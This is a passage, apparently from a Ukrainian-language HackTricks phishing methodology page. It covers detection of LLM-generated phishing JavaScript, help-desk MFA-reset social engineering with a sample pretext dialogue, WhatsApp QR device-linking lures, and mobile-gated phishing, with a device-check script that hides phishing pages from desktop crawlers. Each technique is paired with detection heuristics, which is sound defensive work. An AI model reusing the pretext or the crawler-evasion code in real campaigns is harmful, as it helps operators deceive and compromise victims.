**Ідеї для виявлення**
- Запускайте sandboxes із увімкненим JS; виявляйте **runtime `eval`/динамічне створення скриптів, джерелом яких є відповіді LLM**.
- Виявляйте front-end POST-запити до API LLM, після яких одразу виконуються `eval`/`Function` над отриманим текстом.
- Створюйте alert для несанкціонованих доменів LLM у client traffic із подальшими credential POST-запитами.

---

## Варіант MFA Fatigue / Push Bombing – Примусовий скидання
Окрім класичного push-bombing, оператори просто **примусово ініціюють нову реєстрацію MFA** під час дзвінка до help desk, анулюючи наявний token користувача. Будь-який наступний login prompt здається жертві легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Відстежуйте події AzureAD/AWS/Okta, у яких **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з однієї IP-адреси**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди до буфера обміну жертви зі скомпрометованої або typosquatted вебсторінки, а потім змусити користувача вставити їх у **Win + R**, **Win + X** або вікно термінала, виконавши довільний код без будь-якого завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Distribution of Malicious Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Викрадення прив’язки пристрою WhatsApp через QR social engineering
* Сторінка-приманка (наприклад, фальшивий “канал” міністерства/CERT) відображає QR-код WhatsApp Web/Desktop і вказує жертві відсканувати його, непомітно додаючи зловмисника як **linked device**.<sup>[[12]](#references)</sup>
* Зловмисник одразу отримує видимість чатів і контактів, доки сесію не буде видалено. Пізніше жертви можуть побачити сповіщення “new device linked”; захисники можуть шукати неочікувані події прив’язки пристроїв, що відбулися невдовзі після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing для обходу crawler/sandbox
Оператори дедалі частіше обмежують свої phishing-процеси простою перевіркою пристрою, щоб desktop crawler не доходили до кінцевих сторінок. Поширений шаблон передбачає невеликий скрипт, який перевіряє наявність DOM із підтримкою сенсорного введення та надсилає результат на server endpoint; немобільні клієнти отримують HTTP 500 (або порожню сторінку), тоді як mobile-користувачам надається повний процес.<sup>[[7]](#references)</sup>

Мінімальний client snippet (типова логіка):
```html
<script src="/static/detect_device.js"></script>
```
Логіка `detect_device.js` (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Часто спостерігається така поведінка сервера:
- Встановлює cookie сесії під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, коли `is_mobile=false`; показує phishing лише якщо `true`.

Евристики пошуку та виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Телеметрія Web: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для non-mobile; легітимні шляхи mobile-жертв повертають 200 із подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, які обумовлюють вміст виключно наявністю `ontouchstart` або подібними перевірками пристрою.

Поради щодо захисту:
- Запускайте crawlers із mobile-подібними fingerprint і ввімкненим JS, щоб виявляти gated content.
- Створюйте сповіщення про підозрілі відповіді 500 після `POST /detect` на нових доменах.

## References

- [1] [Генерування варіантів доменів, що використовуються у phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Пошук phishing: інструменти та методики (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Викрадення облікових даних і обхід 2FA за допомогою noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Викрадення сесій і обхід 2FA за допомогою EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Як встановити та налаштувати DKIM із Postfix на Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Глобальний звіт Unit 42 про реагування на інциденти за 2025 рік — видання про Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Тихий Smishing — phishing-інфраструктура з обмеженням для mobile і евристики (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Наступний рубіж атак Runtime Assembly: використання LLM для генерації phishing JavaScript у реальному часі](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Імітація особи, перехоплення кліків і TDS: всередині екосистеми розповсюдження malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Перехоплення трафіку до Microsoft windows.com за допомогою bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Кохання? Насправді: підробний dating app використано як приманку в цільовій spyware-кампанії в Пакистані](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC і зразки ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
